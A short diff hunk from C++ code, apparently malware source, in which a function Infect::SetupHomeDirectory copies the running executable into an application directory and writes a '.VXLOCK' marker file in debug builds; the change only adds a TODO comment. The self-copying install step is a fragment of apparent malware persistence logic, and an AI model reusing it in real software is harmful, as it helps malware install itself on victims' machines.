@@ -47,7 +47,7 @@ void Infect::SetupHomeDirectory()
 	Util::deleteFile(fullAppDir.c_str());
 	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)fullAppDir.c_str());
 
-#if DEBUG
+#if DEBUG //TODO: remove file
 	std::ofstream lock;
 	lock.open(appDir + L"\\.VXLOCK");
 	lock.close();
